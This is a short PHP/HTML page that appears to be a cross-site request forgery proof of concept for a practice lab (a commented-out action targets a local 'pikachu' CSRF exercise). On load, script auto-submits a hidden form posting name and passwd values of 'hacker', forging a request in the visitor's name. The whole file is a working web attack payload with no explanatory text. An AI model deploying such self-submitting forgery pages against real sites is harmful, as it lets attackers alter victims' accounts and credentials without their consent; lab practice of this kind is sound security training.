<?php?>
<html>
<head>
<script>
window.onload = function()
{
    document.getElementById("postsubmit").click();
}
</script>
</head>
<body>
<!--form method="post" action="http://192.168.171.133/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"-->
<form method="post" action="check_post.php">
<input type="hidden" name="name" value="hacker" />
<input type="hidden" name="passwd" value="hacker" />
<input id="postsubmit" type="submit" name="submit" value="" />
</form>
</body>
</html>

